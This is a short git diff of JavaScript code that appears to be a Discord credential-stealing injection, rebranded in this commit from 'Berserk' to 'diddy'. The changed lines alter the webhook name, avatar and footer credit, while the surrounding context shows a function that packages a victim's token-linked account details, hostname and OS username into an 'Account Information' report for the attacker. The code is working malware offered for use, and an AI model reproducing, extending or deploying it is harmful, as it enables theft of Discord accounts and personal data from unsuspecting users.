@@ -151,8 +151,8 @@ const request = async (method, url, headers, data) => {
 const hooker = async (content, token, account) => {
     if (!content || !content.embeds || !content.embeds[0] || !account) return;
     content["content"] = "`" + (os.hostname() || "?") + "` - `" + (os.userInfo().username || "?") + "`\n\n" + (content["content"] || "");
-    content["username"] = "Berserk - cord injection";
-    content["avatar_url"] = "https://ibb.co/GQC7f303";
+    content["username"] = "diddy - cord injection";
+    content["avatar_url"] = "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSQq8vHkcHQOngQNrN6qZRzdhwVqfl8ML7734sMGyiF1v7CR7ycOaqovw4DxunwOfcXsOBrAhKX0ibF5Twa1KmtHJ0PsCRvLsy1L9E7AeA&s=10";
     content["embeds"][0]["author"] = {
         "name": account.username,
     };
@@ -161,7 +161,7 @@ const hooker = async (content, token, account) => {
         : `https://cdn.discordapp.com/embed/avatars/${(parseInt(account.discriminator, 10) || 0) % 5}.png`;
     content["embeds"][0]["thumbnail"] = { "url": thumbUrl };
     content["embeds"][0]["footer"] = {
-        "text": "Berserk discord injection - made by benzoXdev",
+        "text": "diddy discord injection - made by benzoXdev",
         "icon_url": "https://avatars.githubusercontent.com/u/145487845?v=4",
     };
     content["embeds"][0]["title"] = "Account Information";
